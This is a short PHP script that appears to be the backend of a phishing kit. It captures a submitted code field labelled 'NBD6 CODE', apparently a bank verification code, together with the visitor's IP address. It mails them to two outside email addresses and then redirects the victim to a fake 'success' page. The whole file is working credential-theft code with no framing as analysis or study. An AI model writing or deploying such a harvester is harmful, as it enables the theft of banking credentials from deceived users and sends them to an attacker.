<? 

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------OOOO----------------------\n";
$message .= "Codde: ".$_POST['ea']."\n";
$message .= "--------------OOOO NBD6 CODE----------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------OOOO----------------------\n";
$recipient = "abaccolaw@outlook.com, abaccolaw@yahoo.com";
$subject = "NBD6 CODE";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
		
			   header("Location:  https://wandering-violet-9617.on.fleek.co/en/success.html");

	?>
